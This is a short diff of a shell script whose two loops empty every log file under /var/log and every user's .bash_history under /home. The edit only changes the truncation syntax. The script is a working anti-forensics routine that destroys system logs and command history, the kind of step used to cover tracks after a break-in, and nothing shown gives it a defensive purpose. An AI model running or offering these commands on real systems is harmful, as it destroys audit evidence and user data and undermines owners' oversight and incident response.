@@ -7,10 +7,10 @@
 
 for log_file in $(find /var/log -type f);
 do
-  echo 0> $log_file
+  > $log_file
 done;
 
 for home_dir in $(find /home/ -type d);
 do
-  echo 0> $home_dir/.bash_history
+  > $home_dir/.bash_history
 done;
